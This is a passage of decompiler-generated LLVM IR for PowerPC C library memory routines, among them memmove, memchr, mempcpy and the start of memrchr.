  br label %dec_label_pc_10021c74

dec_label_pc_10021c74:                            ; preds = %dec_label_pc_10021c68, %dec_label_pc_10021c48, %dec_label_pc_10021bec, %dec_label_pc_10021ba0, %dec_label_pc_10021c70
  store i32 %v0_10021b54, i32* %r0.global-to-local, align 4
  store i32 %v0_10021b58, i32* @r31, align 4
  %v0_10021c84 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10021c84

; uselistorder directives
  uselistorder i32 %v0_10021c50, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10021bd4, { 1, 0 }
  uselistorder i32 %v3_10021bc4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10021ba4, { 1, 0 }
  uselistorder i32 %v3_10021b94, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10021bf4, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 13, 3, 4, 5, 6, 7, 2, 8, 9, 10, 11, 12, 14, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* @global_var_10044d70.996, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10021c74, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10021c70, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10021c48, { 1, 0 }
  uselistorder label %dec_label_pc_10021c10, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10021c88 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* @r8, align 4
  %v0_10021c90 = load i32, i32* @r5, align 4
  store i32 %v0_10021c90, i32* @r11, align 4
  br i1 %v2_10021c88, label %dec_label_pc_10021c9c, label %dec_label_pc_10021c98

dec_label_pc_10021c98:                            ; preds = %entry
  %v0_10021c98 = call i32 @memcpy()
  %v1_10021c9c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10021c9c

dec_label_pc_10021c9c:                            ; preds = %entry, %dec_label_pc_10021c98
  %v0_10021ca0 = phi i32 [ %arg1, %entry ], [ %v0_10021c98, %dec_label_pc_10021c98 ]
  %v1_10021c9c = phi i32 [ %v0_10021c90, %entry ], [ %v1_10021c9c.pre, %dec_label_pc_10021c98 ]
  %v2_10021c9c = add i32 %v1_10021c9c, %arg2
  store i32 %v2_10021c9c, i32* %r4.global-to-local, align 4
  %v2_10021ca0 = add i32 %v1_10021c9c, %v0_10021ca0
  store i32 %v2_10021ca0, i32* @r10, align 4
  %v1_10021ca4 = call i32 @__asm_rlwinm.(i32 %v1_10021c9c, i32 29, i32 3, i32 31)
  store i32 %v1_10021ca4, i32* %r9.global-to-local, align 4
  %v4_10021ca4 = icmp eq i32 %v1_10021ca4, 0
  br i1 %v4_10021ca4, label %dec_label_pc_10021ccc, label %dec_label_pc_10021cac

dec_label_pc_10021cac:                            ; preds = %dec_label_pc_10021c9c
  %v0_10021cac = load i32, i32* @r10, align 4
  %v1_10021cac = urem i32 %v0_10021cac, 4
  %v3_10021cac = icmp eq i32 %v1_10021cac, 0
  br i1 %v3_10021cac, label %dec_label_pc_10021cb4, label %dec_label_pc_10021d00

dec_label_pc_10021cb4:                            ; preds = %dec_label_pc_10021d18.dec_label_pc_10021cb4_crit_edge, %dec_label_pc_10021cac
  %v1_10021cc0.pre = phi i32 [ %v1_10021cc0.pre.pre, %dec_label_pc_10021d18.dec_label_pc_10021cb4_crit_edge ], [ %v0_10021cac, %dec_label_pc_10021cac ]
  %v0_10021cb4 = phi i32 [ %v1_10021d18, %dec_label_pc_10021d18.dec_label_pc_10021cb4_crit_edge ], [ %v1_10021ca4, %dec_label_pc_10021cac ]
  store i32 %v0_10021cb4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10021cb8

dec_label_pc_10021cb8:                            ; preds = %dec_label_pc_10021cb8, %dec_label_pc_10021cb4
  %v1_10021cc0 = phi i32 [ %v2_10021cc4, %dec_label_pc_10021cb8 ], [ %v1_10021cc0.pre, %dec_label_pc_10021cb4 ]
  %v0_10021cb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021cb8 = add i32 %v0_10021cb8, -4
  %v2_10021cb8 = inttoptr i32 %v1_10021cb8 to i32*
  %v3_10021cb8 = load i32, i32* %v2_10021cb8, align 4
  %v1_10021cbc = add i32 %v0_10021cb8, -8
  %v2_10021cbc = inttoptr i32 %v1_10021cbc to i32*
  %v3_10021cbc = load i32, i32* %v2_10021cbc, align 4
  store i32 %v3_10021cbc, i32* %r9.global-to-local, align 4
  store i32 %v1_10021cbc, i32* %r4.global-to-local, align 4
  %v2_10021cc0 = add i32 %v1_10021cc0, -4
  %v3_10021cc0 = inttoptr i32 %v2_10021cc0 to i32*
  store i32 %v3_10021cb8, i32* %v3_10021cc0, align 4
  %v0_10021cc4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021cc4 = load i32, i32* @r10, align 4
  %v2_10021cc4 = add i32 %v1_10021cc4, -8
  %v3_10021cc4 = inttoptr i32 %v2_10021cc4 to i32*
  store i32 %v0_10021cc4, i32* %v3_10021cc4, align 4
  store i32 %v2_10021cc4, i32* @r10, align 4
  %v0_10021cc8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021cc8 = add i32 %v0_10021cc8, -1
  store i32 %v1_10021cc8, i32* %ctr.global-to-local, align 4
  %v2_10021cc8 = icmp eq i32 %v1_10021cc8, 0
  br i1 %v2_10021cc8, label %dec_label_pc_10021ccc, label %dec_label_pc_10021cb8

dec_label_pc_10021ccc:                            ; preds = %dec_label_pc_10021cb8, %dec_label_pc_10021d18, %dec_label_pc_10021c9c
  %v0_10021ccc = load i32, i32* @r11, align 4
  %v1_10021ccc = urem i32 %v0_10021ccc, 8
  store i32 %v1_10021ccc, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10021ccc, 4
  br i1 %tmp, label %dec_label_pc_10021ce4, label %dec_label_pc_10021cd8

dec_label_pc_10021cd8:                            ; preds = %dec_label_pc_10021ccc
  %v0_10021cd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021cd8 = add i32 %v0_10021cd8, -4
  %v2_10021cd8 = inttoptr i32 %v1_10021cd8 to i32*
  %v3_10021cd8 = load i32, i32* %v2_10021cd8, align 4
  store i32 %v1_10021cd8, i32* %r4.global-to-local, align 4
  %v1_10021cdc = add nsw i32 %v1_10021ccc, -4
  store i32 %v1_10021cdc, i32* %r5.global-to-local, align 4
  %v1_10021ce0 = load i32, i32* @r10, align 4
  %v2_10021ce0 = add i32 %v1_10021ce0, -4
  %v3_10021ce0 = inttoptr i32 %v2_10021ce0 to i32*
  store i32 %v3_10021cd8, i32* %v3_10021ce0, align 4
  store i32 %v2_10021ce0, i32* @r10, align 4
  %v0_10021ce4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021ce4

dec_label_pc_10021ce4:                            ; preds = %dec_label_pc_10021ccc, %dec_label_pc_10021cd8
  %v0_10021cec = phi i32 [ %v1_10021ccc, %dec_label_pc_10021ccc ], [ %v0_10021ce4.pre, %dec_label_pc_10021cd8 ]
  %v3_10021ce4 = icmp eq i32 %v0_10021cec, 0
  br i1 %v3_10021ce4, label %dec_label_pc_10021d24, label %dec_label_pc_10021cec

dec_label_pc_10021cec:                            ; preds = %dec_label_pc_10021ce4
  store i32 %v0_10021cec, i32* %ctr.global-to-local, align 4
  %v2_10021cf4.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_10021cf0

dec_label_pc_10021cf0:                            ; preds = %dec_label_pc_10021cf0, %dec_label_pc_10021cec
  %v2_10021cf4 = phi i32 [ %v3_10021cf4, %dec_label_pc_10021cf0 ], [ %v2_10021cf4.pre, %dec_label_pc_10021cec ]
  %v0_10021cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021cf0 = add i32 %v0_10021cf0, -1
  %v2_10021cf0 = inttoptr i32 %v1_10021cf0 to i8*
  %v3_10021cf0 = load i8, i8* %v2_10021cf0, align 1
  store i32 %v1_10021cf0, i32* %r4.global-to-local, align 4
  %v3_10021cf4 = add i32 %v2_10021cf4, -1
  %v4_10021cf4 = inttoptr i32 %v3_10021cf4 to i8*
  store i8 %v3_10021cf0, i8* %v4_10021cf4, align 1
  store i32 %v3_10021cf4, i32* @r10, align 4
  %v0_10021cf8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021cf8 = add i32 %v0_10021cf8, -1
  store i32 %v1_10021cf8, i32* %ctr.global-to-local, align 4
  %v2_10021cf8 = icmp eq i32 %v1_10021cf8, 0
  br i1 %v2_10021cf8, label %dec_label_pc_10021d24, label %dec_label_pc_10021cf0

dec_label_pc_10021d00:                            ; preds = %dec_label_pc_10021cac
  %v1_10021d00 = sub nsw i32 4, %v1_10021cac
  store i32 %v1_10021d00, i32* %ctr.global-to-local, align 4
  %v1_10021d08 = load i32, i32* @r5, align 4
  %v2_10021d08 = sub i32 %v1_10021d08, %v1_10021d00
  store i32 %v2_10021d08, i32* @r11, align 4
  br label %dec_label_pc_10021d0c

dec_label_pc_10021d0c:                            ; preds = %dec_label_pc_10021d0c, %dec_label_pc_10021d00
  %v2_10021d10 = phi i32 [ %v3_10021d10, %dec_label_pc_10021d0c ], [ %v0_10021cac, %dec_label_pc_10021d00 ]
  %v0_10021d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_10021d0c = add i32 %v0_10021d0c, -1
  %v2_10021d0c = inttoptr i32 %v1_10021d0c to i8*
  %v3_10021d0c = load i8, i8* %v2_10021d0c, align 1
  store i32 %v1_10021d0c, i32* %r4.global-to-local, align 4
  %v3_10021d10 = add i32 %v2_10021d10, -1
  %v4_10021d10 = inttoptr i32 %v3_10021d10 to i8*
  store i8 %v3_10021d0c, i8* %v4_10021d10, align 1
  store i32 %v3_10021d10, i32* @r10, align 4
  %v0_10021d14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021d14 = add i32 %v0_10021d14, -1
  store i32 %v1_10021d14, i32* %ctr.global-to-local, align 4
  %v2_10021d14 = icmp eq i32 %v1_10021d14, 0
  br i1 %v2_10021d14, label %dec_label_pc_10021d18, label %dec_label_pc_10021d0c

dec_label_pc_10021d18:                            ; preds = %dec_label_pc_10021d0c
  %v0_10021d18 = load i32, i32* @r11, align 4
  %v1_10021d18 = call i32 @__asm_rlwinm.(i32 %v0_10021d18, i32 29, i32 3, i32 31)
  store i32 %v1_10021d18, i32* %r9.global-to-local, align 4
  %v4_10021d18 = icmp eq i32 %v1_10021d18, 0
  br i1 %v4_10021d18, label %dec_label_pc_10021ccc, label %dec_label_pc_10021d18.dec_label_pc_10021cb4_crit_edge

dec_label_pc_10021d18.dec_label_pc_10021cb4_crit_edge: ; preds = %dec_label_pc_10021d18
  %v1_10021cc0.pre.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_10021cb4

dec_label_pc_10021d24:                            ; preds = %dec_label_pc_10021cf0, %dec_label_pc_10021ce4
  %v0_10021d24 = load i32, i32* @r8, align 4
  ret i32 %v0_10021d24

; uselistorder directives
  uselistorder i32 %v1_10021d18, { 1, 2, 0 }
  uselistorder i32 %v1_10021d14, { 1, 0 }
  uselistorder i32 %v3_10021d10, { 1, 2, 0 }
  uselistorder i32 %v1_10021cf8, { 1, 0 }
  uselistorder i32 %v3_10021cf4, { 1, 2, 0 }
  uselistorder i32 %v1_10021ccc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10021cc8, { 1, 0 }
  uselistorder i32 %v2_10021cc4, { 1, 2, 0 }
  uselistorder i32 %v1_10021cac, { 1, 0 }
  uselistorder i32 %v0_10021cac, { 2, 1, 0 }
  uselistorder i32 %v1_10021c9c, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 5, 2, 7, 3, 6, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder label %dec_label_pc_10021ce4, { 1, 0 }
  uselistorder label %dec_label_pc_10021ccc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10021c9c, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10021d30 = urem i32 %arg1, 256
  store i32 %v1_10021d30, i32* %r4.global-to-local, align 4
  %v0_10021d507 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_10021d5413 = icmp eq i32 %arg2, 0
  br i1 %v2_10021d5413, label %dec_label_pc_10021d5c, label %dec_label_pc_10021d58

dec_label_pc_10021d3c:                            ; preds = %dec_label_pc_10021d58
  %v1_10021d3c = inttoptr i32 %v0_10021d3c to i8*
  %v2_10021d3c = load i8, i8* %v1_10021d3c, align 1
  %v3_10021d3c = zext i8 %v2_10021d3c to i32
  %v0_10021d40 = load i32, i32* %r5.global-to-local, align 4
  %v1_10021d40 = add i32 %v0_10021d40, -1
  store i32 %v1_10021d40, i32* %r5.global-to-local, align 4
  %v1_10021d44 = load i32, i32* %r4.global-to-local, align 4
  %v4_10021d44 = icmp eq i32 %v3_10021d3c, %v1_10021d44
  %v0_10021d48 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021d44, i32 %v0_10021d48)
  %v0_10021d4c = load i32, i32* @r3, align 4
  %v1_10021d4c = add i32 %v0_10021d4c, 1
  store i32 %v1_10021d4c, i32* @r3, align 4
  %v0_10021d54 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021d54 = add i32 %v0_10021d54, -1
  store i32 %v1_10021d54, i32* %ctr.global-to-local, align 4
  %v2_10021d54 = icmp eq i32 %v1_10021d54, 0
  br i1 %v2_10021d54, label %dec_label_pc_10021d5c.loopexit, label %dec_label_pc_10021d58

dec_label_pc_10021d58:                            ; preds = %entry, %dec_label_pc_10021d3c
  %v0_10021d3c = phi i32 [ %v1_10021d4c, %dec_label_pc_10021d3c ], [ %v0_10021d507, %entry ]
  %v0_10021d58.in.in = phi i32 [ %v1_10021d4c, %dec_label_pc_10021d3c ], [ %v0_10021d507, %entry ]
  %v0_10021d58.in = urem i32 %v0_10021d58.in.in, 4
  %v0_10021d58 = icmp eq i32 %v0_10021d58.in, 0
  br i1 %v0_10021d58, label %dec_label_pc_10021d5c.loopexit, label %dec_label_pc_10021d3c

dec_label_pc_10021d5c.loopexit:                   ; preds = %dec_label_pc_10021d58, %dec_label_pc_10021d3c
  %v0_10021d8416.ph = phi i32 [ %v1_10021d4c, %dec_label_pc_10021d3c ], [ %v0_10021d3c, %dec_label_pc_10021d58 ]
  %v0_10021d5c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10021d60.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021d5c

dec_label_pc_10021d5c:                            ; preds = %dec_label_pc_10021d5c.loopexit, %entry
  %v0_10021d60 = phi i32 [ %v1_10021d30, %entry ], [ %v0_10021d60.pre, %dec_label_pc_10021d5c.loopexit ]
  %v0_10021d5c = phi i32 [ 0, %entry ], [ %v0_10021d5c.pre, %dec_label_pc_10021d5c.loopexit ]
  %v0_10021d8416 = phi i32 [ %v0_10021d507, %entry ], [ %v0_10021d8416.ph, %dec_label_pc_10021d5c.loopexit ]
  %v1_10021d5c = udiv i32 %v0_10021d5c, 4
  %v1_10021d60 = mul i32 %v0_10021d60, 256
  %v1_10021d64 = add nuw nsw i32 %v1_10021d5c, 1
  store i32 %v1_10021d64, i32* @r11, align 4
  %v2_10021d68 = or i32 %v1_10021d60, %v0_10021d60
  %v1_10021d70 = mul i32 %v2_10021d68, 65536
  %v2_10021d78 = or i32 %v1_10021d70, %v2_10021d68
  store i32 %v1_10021d5c, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10021d5c, 4
  br i1 %tmp, label %dec_label_pc_10021e0c, label %dec_label_pc_10021d84

dec_label_pc_10021d84:                            ; preds = %dec_label_pc_10021d5c, %dec_label_pc_10021e08.backedge
  %v0_10021e08 = phi i32 [ %v1_10021e08, %dec_label_pc_10021e08.backedge ], [ %v1_10021d5c, %dec_label_pc_10021d5c ]
  %v0_10021d8c = phi i32 [ %v1_10021d8c, %dec_label_pc_10021e08.backedge ], [ %v0_10021d5c, %dec_label_pc_10021d5c ]
  %v0_10021dc4 = phi i32 [ %v1_10021d88, %dec_label_pc_10021e08.backedge ], [ %v0_10021d8416, %dec_label_pc_10021d5c ]
  %v1_10021d84 = inttoptr i32 %v0_10021dc4 to i32*
  %v2_10021d84 = load i32, i32* %v1_10021d84, align 4
  %v1_10021d88 = add i32 %v0_10021dc4, 4
  store i32 %v1_10021d88, i32* @r3, align 4
  %v1_10021d8c = add i32 %v0_10021d8c, -4
  store i32 %v1_10021d8c, i32* %r5.global-to-local, align 4
  %v2_10021d90 = xor i32 %v2_10021d84, %v2_10021d78
  %v1_10021d98 = add i32 %v2_10021d90, 2130640639
  %v2_10021d9c = xor i32 %v1_10021d98, %v2_10021d90
  store i32 %v0_10021dc4, i32* @r11, align 4
  %v2_10021da4 = and i32 %v2_10021d9c, -2130640640
  %v6_10021da4 = icmp eq i32 %v2_10021da4, -2130640640
  br i1 %v6_10021da4, label %dec_label_pc_10021e08.backedge, label %dec_label_pc_10021dac

dec_label_pc_10021e08.backedge:                   ; preds = %dec_label_pc_10021d84, %dec_label_pc_10021df4
  %v1_10021e08 = add i32 %v0_10021e08, -1
  store i32 %v1_10021e08, i32* %ctr.global-to-local, align 4
  %v2_10021e08 = icmp eq i32 %v1_10021e08, 0
  br i1 %v2_10021e08, label %dec_label_pc_10021e0c, label %dec_label_pc_10021d84

dec_label_pc_10021dac:                            ; preds = %dec_label_pc_10021d84
  %v2_10021dac = inttoptr i32 %v0_10021dc4 to i8*
  %v3_10021dac = load i8, i8* %v2_10021dac, align 1
  %v4_10021dac = zext i8 %v3_10021dac to i32
  %v1_10021db0 = add i32 %v0_10021dc4, 3
  store i32 %v1_10021db0, i32* @r8, align 4
  %v1_10021db4 = add i32 %v0_10021dc4, 1
  %v1_10021db8 = add i32 %v0_10021dc4, 2
  store i32 %v1_10021db8, i32* @r10, align 4
  %v4_10021dbc = icmp eq i32 %v4_10021dac, %v0_10021d60
  br i1 %v4_10021dbc, label %dec_label_pc_10021dc4, label %dec_label_pc_10021dcc

dec_label_pc_10021dc4:                            ; preds = %dec_label_pc_10021dac
  ret i32 %v0_10021dc4

dec_label_pc_10021dcc:                            ; preds = %dec_label_pc_10021dac
  %v2_10021dcc = inttoptr i32 %v1_10021db4 to i8*
  %v3_10021dcc = load i8, i8* %v2_10021dcc, align 1
  %v4_10021dcc = zext i8 %v3_10021dcc to i32
  %v4_10021dd0 = icmp eq i32 %v4_10021dcc, %v0_10021d60
  br i1 %v4_10021dd0, label %dec_label_pc_10021dd8, label %dec_label_pc_10021de0

dec_label_pc_10021dd8:                            ; preds = %dec_label_pc_10021dcc
  ret i32 %v1_10021db4

dec_label_pc_10021de0:                            ; preds = %dec_label_pc_10021dcc
  %v2_10021de0 = inttoptr i32 %v1_10021db8 to i8*
  %v3_10021de0 = load i8, i8* %v2_10021de0, align 1
  %v4_10021de0 = zext i8 %v3_10021de0 to i32
  %v4_10021de4 = icmp eq i32 %v4_10021de0, %v0_10021d60
  br i1 %v4_10021de4, label %dec_label_pc_10021dec, label %dec_label_pc_10021df4

dec_label_pc_10021dec:                            ; preds = %dec_label_pc_10021de0
  ret i32 %v1_10021db8

dec_label_pc_10021df4:                            ; preds = %dec_label_pc_10021de0
  %v2_10021df4 = inttoptr i32 %v1_10021db0 to i8*
  %v3_10021df4 = load i8, i8* %v2_10021df4, align 1
  %v4_10021df4 = zext i8 %v3_10021df4 to i32
  %v4_10021df8 = icmp eq i32 %v4_10021df4, %v0_10021d60
  br i1 %v4_10021df8, label %dec_label_pc_10021e00, label %dec_label_pc_10021e08.backedge

dec_label_pc_10021e00:                            ; preds = %dec_label_pc_10021df4
  ret i32 %v1_10021db0

dec_label_pc_10021e0c:                            ; preds = %dec_label_pc_10021e08.backedge, %dec_label_pc_10021d5c
  %v0_10021e1826 = phi i32 [ %v0_10021d8416, %dec_label_pc_10021d5c ], [ %v1_10021d88, %dec_label_pc_10021e08.backedge ]
  %v0_10021e0c = phi i32 [ %v0_10021d5c, %dec_label_pc_10021d5c ], [ %v1_10021d8c, %dec_label_pc_10021e08.backedge ]
  %v1_10021e0c = add i32 %v0_10021e0c, 1
  store i32 %v1_10021e0c, i32* %r5.global-to-local, align 4
  store i32 %v0_10021e0c, i32* %ctr.global-to-local, align 4
  %v2_10021e283 = icmp eq i32 %v0_10021e0c, 0
  br i1 %v2_10021e283, label %dec_label_pc_10021e2c, label %dec_label_pc_10021e18

dec_label_pc_10021e18:                            ; preds = %dec_label_pc_10021e0c, %dec_label_pc_10021e18.dec_label_pc_10021e18_crit_edge
  %v1_10021e1c = phi i32 [ %v1_10021e1c.pre, %dec_label_pc_10021e18.dec_label_pc_10021e18_crit_edge ], [ %v0_10021d60, %dec_label_pc_10021e0c ]
  %v0_10021e18 = phi i32 [ %v1_10021e24, %dec_label_pc_10021e18.dec_label_pc_10021e18_crit_edge ], [ %v0_10021e1826, %dec_label_pc_10021e0c ]
  %v1_10021e18 = inttoptr i32 %v0_10021e18 to i8*
  %v2_10021e18 = load i8, i8* %v1_10021e18, align 1
  %v3_10021e18 = zext i8 %v2_10021e18 to i32
  %v4_10021e1c = icmp eq i32 %v3_10021e18, %v1_10021e1c
  %v0_10021e20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021e1c, i32 %v0_10021e20)
  %v0_10021e24 = load i32, i32* @r3, align 4
  %v1_10021e24 = add i32 %v0_10021e24, 1
  store i32 %v1_10021e24, i32* @r3, align 4
  %v0_10021e28 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021e28 = add i32 %v0_10021e28, -1
  store i32 %v1_10021e28, i32* %ctr.global-to-local, align 4
  %v2_10021e28 = icmp eq i32 %v1_10021e28, 0
  br i1 %v2_10021e28, label %dec_label_pc_10021e2c, label %dec_label_pc_10021e18.dec_label_pc_10021e18_crit_edge

dec_label_pc_10021e18.dec_label_pc_10021e18_crit_edge: ; preds = %dec_label_pc_10021e18
  %v1_10021e1c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021e18

dec_label_pc_10021e2c:                            ; preds = %dec_label_pc_10021e18, %dec_label_pc_10021e0c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10021e28, { 1, 0 }
  uselistorder i32 %v1_10021e24, { 1, 0 }
  uselistorder i32 %v0_10021e0c, { 1, 2, 0 }
  uselistorder i32 %v1_10021e08, { 2, 1, 0 }
  uselistorder i32 %v1_10021d8c, { 0, 2, 1 }
  uselistorder i32 %v1_10021d88, { 0, 2, 1 }
  uselistorder i32 %v0_10021dc4, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v2_10021d68, { 1, 0 }
  uselistorder i32 %v1_10021d5c, { 2, 1, 0 }
  uselistorder i32 %v0_10021d8416, { 1, 0 }
  uselistorder i32 %v0_10021d5c, { 3, 2, 0, 1 }
  uselistorder i32 %v0_10021d60, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v1_10021d54, { 1, 0 }
  uselistorder i32 %v1_10021d4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10021d507, { 2, 0, 1 }
  uselistorder i32 %v1_10021d30, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10021e18, { 1, 0 }
  uselistorder label %dec_label_pc_10021e08.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10021d84, { 1, 0 }
  uselistorder label %dec_label_pc_10021d58, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268574288, i32* @lr, align 4
  %v0_10021e4c = call i32 @memcpy()
  %v0_10021e54 = load i32, i32* @r28, align 4
  %v1_10021e54 = load i32, i32* @r29, align 4
  %v2_10021e54 = add i32 %v1_10021e54, %v0_10021e54
  ret i32 %v2_10021e54
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10021e6c = urem i32 %arg2, 256
  store i32 %v1_10021e6c, i32* %r4.global-to-local, align 4
  %v2_10021e74 = add i32 %arg3, %arg1
  store i32 %v2_10021e74, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_10021e9013 = icmp eq i32 %arg3, 0
  br i1 %v2_10021e9013, label %dec_label_pc_10021e98, label %dec_label_pc_10021e94

dec_label_pc_10021e7c:                            ; preds = %dec_label_pc_10021e94
  %v1_10021e7c = add i32 %v0_10021e7c, -1
  %v2_10021e7c = inttoptr i32 %v1_10021e7c to i8*
  %v3_10021e7c = load i8, i8* %v2_10021e7c, align 1
  %v4_10021e7c = zext i8 %v3_10021e7c to i32
  store i32 %v1_10021e7c, i32* %r3.global-to-local, align 4
  %v0_10021e80 = load i32, i32* %r5.global-to-local, align 4
  %v1_10021e80 = add i32 %v0_10021e80, -1
  store i32 %v1_10021e80, i32* %r5.global-to-local, align 4
  %v1_10021e84 = load i32, i32* %r4.global-to-local, align 4
  %v4_10021e84 = icmp eq i32 %v4_10021e7c, %v1_10021e84
  %v0_10021e88 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021e84, i32 %v0_10021e88)
  %v0_10021e8c = load i32, i32* %r3.global-to-local, align 4
  %v0_10021e90 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021e90 = add i32 %v0_10021e90, -1
  store i32 %v1_10021e90, i32* %ctr.global-to-local, align 4
  %v2_10021e90 = icmp eq i32 %v1_10021e90, 0
  br i1 %v2_10021e90, label %dec_label_pc_10021e98.loopexit, label %dec_label_pc_10021e94

dec_label_pc_10021e94:                            ; preds = %entry, %dec_label_pc_10021e7c
  %v0_10021e7c = phi i32 [ %v0_10021e8c, %dec_label_pc_10021e7c ], [ %v2_10021e74, %entry ]
  %v0_10021e94.in.in = phi i32 [ %v0_10021e8c, %dec_label_pc_10021e7c ], [ %v2_10021e74, %entry ]
  %v0_10021e94.in = urem i32 %v0_10021e94.in.in, 4
  %v0_10021e94 = icmp eq i32 %v0_10021e94.in, 0
  br i1 %v0_10021e94, label %dec_label_pc_10021e98.loopexit, label %dec_label_pc_10021e7c

dec_label_pc_10021e98.loopexit:                   ; preds = %dec_label_pc_10021e94, %dec_label_pc_10021e7c
  %v0_10021ec016.ph = phi i32 [ %v0_10021e8c, %dec_label_pc_10021e7c ], [ %v0_10021e7c, %dec_label_pc_10021e94 ]
  %v0_10021e98.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10021e9c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021e98

dec_label_pc_10021e98:                            ; preds = %dec_label_pc_10021e98.loopexit, %entry
  %v0_10021e9c = phi i32 [ %v1_10021e6c, %entry ], [ %v0_10021e9c.pre, %dec_label_pc_10021e98.loopexit ]
  %v0_10021e98 = phi i32 [ 0, %entry ], [ %v0_10021e98.pre, %dec_label_pc_10021e98.loopexit ]
  %v0_10021ec016 = phi i32 [ %v2_10021e74, %entry ], [ %v0_10021ec016.ph, %dec_label_pc_10021e98.loopexit ]
  %v1_10021e98 = udiv i32 %v0_10021e98, 4
  %v1_10021e9c = mul i32 %v0_10021e9c, 256
  %v1_10021ea0 = add nuw nsw i32 %v1_10021e98, 1
  store i32 %v1_10021ea0, i32* @r11, align 4
  %v2_10021ea4 = or i32 %v1_10021e9c, %v0_10021e9c
  %v1_10021eac = mul i32 %v2_10021ea4, 65536
  %v2_10021eb4 = or i32 %v1_10021eac, %v2_10021ea4
  store i32 %v2_10021eb4, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10021e98, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10021e98, 4
  br i1 %tmp, label %dec_label_pc_10021f38, label %dec_label_pc_10021ec0

dec_label_pc_10021ec0:                            ; preds = %dec_label_pc_10021e98, %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge
  %v0_10021f3421 = phi i32 [ %v1_10021f34, %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge ], [ %v1_10021e98, %dec_label_pc_10021e98 ]
